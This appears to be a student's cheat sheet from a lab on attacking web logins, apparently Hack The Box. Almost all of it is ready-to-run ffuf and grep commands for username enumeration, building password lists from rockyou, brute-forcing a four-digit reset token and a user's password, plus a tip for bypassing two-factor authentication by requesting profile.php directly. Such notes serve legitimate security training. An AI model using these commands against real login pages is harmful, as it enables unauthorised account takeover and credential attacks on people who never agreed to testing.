```
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

```
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

```
seq -w 0 9999 > tokens.txt
```

```
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

default credentials https://cirt.net/passwords/

```
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.73:30522/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=hi7dbhlrj4ai3o4rsqvqft60k6" -d "username=FUZZ&password=invalid" -mr "Invalid credentials." -ic

```
https://weakpass.com/wordlists/rockyou.txt
gunzip rockyou.txt.gz
```
grep -a '[[:upper:]]' rockyou.txt | grep -a '[[:lower:]]' | grep -a '[[:digit:]]' | grep -a -E '^.{12}$' | grep -a -v '[^[:alnum:]]' > custom_wordlist.txt

```

```
ffuf -w custom_wordlist.txt -u http://154.57.164.73:30522/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=hi7dbhlrj4ai3o4rsqvqft60k6" -d "username=gladys&password=FUZZ" -fc 200 -ic
```

-once you are redirected to the 2fa page see if you can send the login request first then skip the 2fa altogether by sending a get request to profile.php